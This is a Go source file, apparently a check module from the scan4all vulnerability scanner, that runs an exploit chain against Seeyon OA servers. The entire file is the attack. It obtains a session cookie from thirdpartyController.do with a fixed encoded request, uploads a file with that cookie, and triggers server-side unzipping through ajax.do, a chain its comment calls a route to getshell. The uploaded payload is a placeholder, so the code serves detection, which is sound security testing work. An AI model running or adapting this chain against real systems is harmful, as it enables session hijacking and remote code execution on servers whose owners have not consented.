package seeyon

import (
	"bytes"
	"github.com/GhostTroops/scan4all/lib/util"
	"mime/multipart"
	"net/textproto"
	"regexp"
	"time"
)

//session泄露&&文件上传getshell

func SessionUpload(u string) bool {
	if session := getsession(u); session != "" {
		if filename := upload(u, session); filename != "" {
			if unzip(u, filename, session) {
				util.SendLog(u, "seeyon", "Found vuln seeyon poc SessionUpload", "")
				return true
			}
		}
	}
	return false
}

func getsession(u string) string {
	data := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"

	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	if req, err := util.HttpRequset(u+"/seeyon/thirdpartyController.do", "POST", data, false, header); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "a8genius.do") && req.Header.Get("Set-Cookie") != "" {
			return req.Header.Get("Set-Cookie")
		}
	}
	return ""
}

func upload(u string, cookie string) string {
	buf := new(bytes.Buffer)
	w := multipart.NewWriter(buf)
	h := make(textproto.MIMEHeader)
	h.Set("Content-Disposition", `form-data; name="file1"; filename="123.png"`)
	h.Set("Content-Type", "image/png")
	fw, err := w.CreatePart(h)
	if err != nil {
		return ""
	}
	_, _ = fw.Write([]byte("1"))
	boundary := w.Boundary()
	_ = w.WriteField("firstSave", "true")
	_ = w.WriteField("callMethod", "resizeLayout")
	_ = w.WriteField("isEncrypt", "0")
	_ = w.WriteField("takeOver", "false")
	_ = w.WriteField("type", "0")
	_ = w.Close()
	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=" + boundary
	header["Cookie"] = cookie
	if req, err := util.HttpRequset(u+"/seeyon/fileUpload.do?method=processUpload", "POST", buf.String(), false, header); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "fileurls=fileurls") {
			filenamelist := regexp.MustCompile(`fileurls=fileurls\+["'],["']\+["'](.+)["']`).FindStringSubmatch(req.Body)
			if filenamelist != nil {
				filename := filenamelist[len(filenamelist)-1:][0]
				return filename
			}
		}
	}
	return ""
}

func unzip(u string, filename string, cookie string) bool {
	data := "method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22" + time.Unix(time.Now().Unix(), 0).Format("2006-01-02") + "%22%2C%22" + filename + "%22%5D"
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["Cookie"] = cookie
	if req, err := util.HttpRequset(u+"/seeyon/ajax.do", "POST", data, false, header); err == nil {
		if req.StatusCode == 500 {
			return true
		}
	}
	return false
}
